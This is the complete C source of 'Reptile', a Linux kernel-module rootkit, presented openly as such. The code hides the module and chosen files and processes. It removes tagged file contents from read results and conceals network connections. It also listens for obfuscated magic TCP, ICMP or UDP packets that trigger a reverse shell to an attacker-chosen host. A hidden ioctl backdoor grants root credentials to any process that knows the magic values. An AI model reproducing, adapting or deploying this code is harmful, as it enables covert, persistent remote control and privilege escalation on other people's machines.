/* REPTILE ROOTKIT
 *
 * A LKM Linux rootkit
 * Author: F0rb1dd3n
 *
 */

#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/uaccess.h>
#include <linux/udp.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/workqueue.h>
#include <net/inet_sock.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
#include <linux/fdtable.h>
#endif

#include "engine/engine.c"
#include "engine/engine.h"

#include "config.h"

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

#define bzero(b, len) (memset((b), '\0', (len)), (void)0)
#define SSIZE_MAX 32767
#define AUTH 0xdeadbeef
#define HTUA 0xc0debabe
#define RL_BUFSIZE 2048
#define TOK_BUFSIZE 64
#define TOK_DELIM                                                              \
	({                                                                     \
		unsigned int *p = __builtin_alloca(4);                         \
		p[0] = 0x00000020;                                             \
		(char *)p;                                                     \
	})
#define ID 12345
#define SEQ 28782
#define WIN 8192
#define TMPSZ 150

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
#define VFS_READ                                                               \
	({                                                                     \
		unsigned int *p = (unsigned int *)__builtin_alloca(9);         \
		p[0] = 0x5f736676;                                             \
		p[1] = 0x64616572;                                             \
		p[2] = 0x00;                                                   \
		(char *)p;                                                     \
	})

asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf,
				    size_t count, loff_t *pos);
#endif

int hidden = 0, hide_file_content = 0, control_flag = 0;
struct workqueue_struct *work_queue;
static struct nf_hook_ops magic_packet_hook_options;
static struct list_head *mod_list;

struct control {
	unsigned short cmd;
	void *argv;
};

struct shell_task {
	struct work_struct work;
	char *path;
	char *ip;
	char *port;
	char *secret;
};

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

struct hidden_conn {
	struct sockaddr_in addr;
	struct list_head list;
};

LIST_HEAD(hidden_tcp_conn);

struct ksym {
	char *name;
	unsigned long addr;
};

int find_ksym(void *data, const char *name, struct module *module,
	      unsigned long address)
{
	struct ksym *ksym = (struct ksym *)data;
	char *target = ksym->name;

	if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
		ksym->addr = address;
		return 1;
	}

	return 0;
}

unsigned long get_symbol(char *name)
{
	unsigned long symbol = 0;
	struct ksym ksym;

	ksym.name = name;
	ksym.addr = 0;
	kallsyms_on_each_symbol(&find_ksym, &ksym);
	symbol = ksym.addr;

	return symbol;
}

void hide(void)
{
	if (hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	hidden = 1;
}

void show(void)
{
	if (!hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);
	hidden = 0;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	struct task_struct *ret = NULL;

	rcu_read_lock();
	for_each_process(p)
	{
		if (p->pid == pid) {
			get_task_struct(p);
			ret = p;
		}
	}
	rcu_read_unlock();

	return ret;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;
	task = find_task(pid);
	if (!task)
		return ret;
	if (task->flags & 0x10000000)
		ret = 1;
	put_task_struct(task);
	return ret;
}

void exec(char **argv)
{
	char *path = PATH;
	char *envp[] = {path, NULL};
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void shell_execer(struct work_struct *work)
{
	struct shell_task *task = (struct shell_task *)work;
	char *argv[] = {task->path,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000742d;
				(char *)p;
			}),
			task->ip,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000702d;
				(char *)p;
			}),
			task->port,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000732d;
				(char *)p;
			}),
			task->secret,
			NULL};

	exec(argv);
	kfree(task->path);
	kfree(task->ip);
	kfree(task->port);
	kfree(task->secret);
	kfree(task);
}

int shell_exec_queue(char *path, char *ip, char *port, char *secret)
{
	struct shell_task *task;

	task = kmalloc(sizeof(*task), GFP_KERNEL);

	if (!task)
		return -1;

	REPTILE_INIT_WORK(&task->work, &shell_execer);
	task->path = kstrdup(path, GFP_KERNEL);
	if (!task->path) {
		kfree(task);
		return -1;
	}

	task->ip = kstrdup(ip, GFP_KERNEL);
	if (!task->ip) {
		kfree(task->path);
		kfree(task);
		return -1;
	}

	task->port = kstrdup(port, GFP_KERNEL);
	if (!task->port) {
		kfree(task->path);
		kfree(task->ip);
		kfree(task);
		return -1;
	}

	task->secret = kstrdup(secret, GFP_KERNEL);
	if (!task->secret) {
		kfree(task->path);
		kfree(task->ip);
		kfree(task->port);
		kfree(task);
		return -1;
	}

	return queue_work(work_queue, &task->work);
}

struct file *e_fget_light(unsigned int fd, int *fput_needed)
{
	struct file *file;
	struct files_struct *files = current->files;

	*fput_needed = 0;
	if (likely((atomic_read(&files->count) == 1))) {
		file = fcheck(fd);
	} else {
		spin_lock(&files->file_lock);
		file = fcheck(fd);
		if (file) {
			get_file(file);
			*fput_needed = 1;
		}
		spin_unlock(&files->file_lock);
	}
	return file;
}

int f_check(void *arg, ssize_t size)
{
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX))
		return (-1);

	buf = (char *)kmalloc(size + 1, GFP_KERNEL);
	if (!buf)
		return (-1);

	if (copy_from_user((void *)buf, (void *)arg, size))
		goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) &&
	    (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return (1);
	}
out:
	kfree(buf);
	return (-1);
}

int hide_content(void *arg, ssize_t size)
{
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *)kmalloc(size, GFP_KERNEL);
	if (!buf)
		return (-1);

	if (copy_from_user((void *)buf, (void *)arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	if (p1 >= p2 || !p1 || !p2) {
		kfree(buf);
		return size;
	}

	i = size - (p2 - buf);
	memmove((void *)p1, (void *)p2, i);
	newret = size - (p2 - p1);

	if (copy_to_user((void *)arg, (void *)buf, newret)) {
		kfree(buf);
		return size;
	}

	kfree(buf);
	return newret;
}

char **parse(char *line)
{
	int bufsize = TOK_BUFSIZE, position = 0;
	char **tokens = kmalloc(bufsize * sizeof(char *), GFP_KERNEL);
	char *token, **tokens_backup;

	if (!tokens)
		return NULL;

	token = line;
	token = strsep(&line, TOK_DELIM);
	while (token != NULL) {
		tokens[position] = token;
		position++;

		if (position >= bufsize) {
			bufsize += TOK_BUFSIZE;
			tokens_backup = tokens;
			tokens = krealloc(tokens, bufsize * sizeof(char *),
					  GFP_KERNEL);
			if (!tokens) {
				kfree(tokens_backup);
				return NULL;
			}
		}

		token = strsep(&line, TOK_DELIM);
	}
	tokens[position] = NULL;
	return tokens;
}

void _xor(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] ^= key;
}

void _add(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] += key;
}

void _sub(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] -= key;
}

unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
			       struct sk_buff *socket_buffer,
			       const struct net_device *in,
			       const struct net_device *out,
			       int (*okfn)(struct sk_buff *))
{
	const struct iphdr *ip_header;
	const struct icmphdr *icmp_header;
	const struct tcphdr *tcp_header;
	const struct udphdr *udp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	struct tcphdr _tcph;
	struct udphdr _udph;
	const char *data = NULL;
	char *_data, *string, **args;
	char *token = TOKEN;
	int size, tok_len;

	tok_len = strlen(token);
	_xor(token, 11, tok_len);
	_add(token, 15, tok_len);

	if (!socket_buffer)
		return NF_ACCEPT;

	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

	if (!ip_header)
		return NF_ACCEPT;

	if (!ip_header->protocol)
		return NF_ACCEPT;

	if (htons(ip_header->id) != ID)
		return NF_ACCEPT;

	if (ip_header->protocol == IPPROTO_TCP) {
		tcp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);

		if (!tcp_header)
			return NF_ACCEPT;

		if (htons(tcp_header->source) != SRCPORT)
			return NF_ACCEPT;

		if (htons(tcp_header->seq) == SEQ &&
		    htons(tcp_header->window) == WIN) {

			size = htons(ip_header->tot_len) - sizeof(_iph) -
			       sizeof(_tcph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						  ip_header->ihl * 4 +
						      sizeof(struct tcphdr),
						  size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1],
							 args[2], PASS);
					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	if (ip_header->protocol == IPPROTO_ICMP) {
		icmp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

		if (!icmp_header)
			return NF_ACCEPT;

		if (icmp_header->code != ICMP_ECHO)
			return NF_ACCEPT;

		if (htons(icmp_header->un.echo.sequence) == SEQ &&
		    htons(icmp_header->un.echo.id) == WIN) {

			size = htons(ip_header->tot_len) - sizeof(_iph) -
			       sizeof(_icmph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						  ip_header->ihl * 4 +
						      sizeof(struct icmphdr),
						  size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1],
							 args[2], PASS);

					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	if (ip_header->protocol == IPPROTO_UDP) {
		udp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);

		if (!udp_header)
			return NF_ACCEPT;

		if (htons(udp_header->source) != SRCPORT)
			return NF_ACCEPT;

		if (htons(udp_header->len) <=
		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {

			size = htons(ip_header->tot_len) - sizeof(_iph) -
			       sizeof(_udph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						  ip_header->ihl * 4 +
						      sizeof(struct udphdr),
						  size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1],
							 args[2], PASS);

					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	return NF_ACCEPT;
}

KHOOK(sys_getdents64);
static int khook_sys_getdents64(unsigned int fd,
				struct linux_dirent64 __user *dirent,
				unsigned int count)
{
	int ret;
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;

	KHOOK_GET(sys_getdents64);
	ret = KHOOK_ORIGIN(sys_getdents64, fd, dirent, count);

	if (!hidden)
		goto final;

	if (ret <= 0)
		goto final;

	kdir = kzalloc(ret, GFP_KERNEL);
	if (kdir == NULL)
		goto final;

	if (copy_from_user(kdir, dirent, ret))
		goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		p = 1;

	while (off < ret) {
		dir = (void *)kdir + off;
		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
		    (p &&
		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if (copy_to_user(dirent, kdir, ret))
		goto end;

end:
	kfree(kdir);
final:
	KHOOK_PUT(sys_getdents64);
	return ret;
}

KHOOK(sys_getdents);
static int khook_sys_getdents(unsigned int fd,
			      struct linux_dirent __user *dirent,
			      unsigned int count)
{
	int ret;
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;

	KHOOK_GET(sys_getdents);
	ret = KHOOK_ORIGIN(sys_getdents, fd, dirent, count);

	if (!hidden)
		goto final;

	if (ret <= 0)
		goto final;

	kdir = kzalloc(ret, GFP_KERNEL);
	if (kdir == NULL)
		goto final;

	if (copy_from_user(kdir, dirent, ret))
		goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		p = 1;

	while (off < ret) {
		dir = (void *)kdir + off;
		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
		    (p &&
		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if (copy_to_user(dirent, kdir, ret))
		goto end;

end:
	kfree(kdir);

final:
	KHOOK_PUT(sys_getdents);
	return ret;
}

KHOOK(sys_read);
static ssize_t khook_sys_read(unsigned int fd, char __user *buf, size_t count)
{
	struct file *f;
	int fput_needed;
	ssize_t ret;

	KHOOK_GET(sys_read);

	if (hide_file_content) {
		ret = -EBADF;

		f = e_fget_light(fd, &fput_needed);

		if (f) {
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
			ret = vfs_read(f, buf, count, &f->f_pos);
#else
			ret = vfs_read_addr(f, buf, count, &f->f_pos);
#endif
			if (f_check(buf, ret) == 1)
				ret = hide_content(buf, ret);

			fput_light(f, fput_needed);
		}
	} else {
		ret = KHOOK_ORIGIN(sys_read, fd, buf, count);
	}

	KHOOK_PUT(sys_read);

	return ret;
}

KHOOK_EXT(int, inet_ioctl, struct socket *sock, unsigned int cmd,
	  unsigned long arg);
static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
			    unsigned long arg)
{
	int ret = 0;
	unsigned int pid;
	struct control args;
	struct sockaddr_in addr;
	struct task_struct *task;
	struct hidden_conn *hc;

	KHOOK_GET(inet_ioctl);
	if (cmd == AUTH && arg == HTUA) {
		if (control_flag) {
			control_flag = 0;
		} else {
			control_flag = 1;
		}

		goto out;
	}

	if (control_flag && cmd == AUTH) {
		if (copy_from_user(&args, (void *)arg, sizeof(args)))
			goto out;

		switch (args.cmd) {
		case 0:
			if (hidden)
				show();
			else
				hide();
			break;
		case 1:
			if (copy_from_user(&pid, args.argv,
					   sizeof(unsigned int)))
				goto out;

			if ((task = find_task(pid)) == NULL)
				goto out;

			task->flags ^= 0x10000000;
			put_task_struct(task);
			break;
		case 2:
			if (hide_file_content)
				hide_file_content = 0;
			else
				hide_file_content = 1;
			break;
		case 3:
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
			current->uid = 0;
			current->suid = 0;
			current->euid = 0;
			current->gid = 0;
			current->egid = 0;
			current->fsuid = 0;
			current->fsgid = 0;
			cap_set_full(current->cap_effective);
			cap_set_full(current->cap_inheritable);
			cap_set_full(current->cap_permitted);
#else
			commit_creds(prepare_kernel_cred(0));
#endif
			break;
		case 4:
			if (copy_from_user(&addr, args.argv,
					   sizeof(struct sockaddr_in)))
				goto out;

			hc = kmalloc(sizeof(*hc), GFP_KERNEL);

			if (!hc)
				goto out;

			hc->addr = addr;

			list_add(&hc->list, &hidden_tcp_conn);
			break;
		case 5:
			if (copy_from_user(&addr, args.argv,
					   sizeof(struct sockaddr_in)))
				goto out;

			list_for_each_entry(hc, &hidden_tcp_conn, list)
			{
				if (addr.sin_port == hc->addr.sin_port &&
				    addr.sin_addr.s_addr ==
					hc->addr.sin_addr.s_addr) {
					list_del(&hc->list);
					kfree(hc);
					break;
				}
			}
			break;
		default:
			goto origin;
		}

		goto out;
	}

origin:
	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
out:
	KHOOK_PUT(inet_ioctl);
	return ret;
}

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *seq, void *v);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned short dport;
	unsigned int daddr;

	KHOOK_GET(tcp4_seq_show);

	seq_setwidth(seq, TMPSZ - 1);
	if (v == SEQ_START_TOKEN) {
		ret = 0;
		goto out;
	}

	inet = (struct inet_sock *)sk;
	dport = inet->inet_dport;
	daddr = inet->inet_daddr;

	list_for_each_entry(hc, &hidden_tcp_conn, list)
	{
		if (hc->addr.sin_port == dport &&
		    hc->addr.sin_addr.s_addr == daddr) {
			ret = 0;
			goto out;
		}
	}

	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	KHOOK_PUT(tcp4_seq_show);
	return ret;
}

static int __init reptile_init(void)
{
	int ret;
	char *argv[] = {START, NULL, NULL};

	hide();

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
	vfs_read_addr = (void *)get_symbol(VFS_READ);
#endif
	work_queue = create_workqueue(WORKQUEUE);

	magic_packet_hook_options.hook = (void *)magic_packet_hook;
	magic_packet_hook_options.hooknum = 0;
	magic_packet_hook_options.pf = PF_INET;
	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_register_net_hook(&init_net, &magic_packet_hook_options);
#else
	nf_register_hook(&magic_packet_hook_options);
#endif
	ret = khook_init();
	exec(argv);

	return ret;
}

static void __exit reptile_exit(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
#else
	nf_unregister_hook(&magic_packet_hook_options);
#endif

	flush_workqueue(work_queue);
	destroy_workqueue(work_queue);
	khook_cleanup();
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
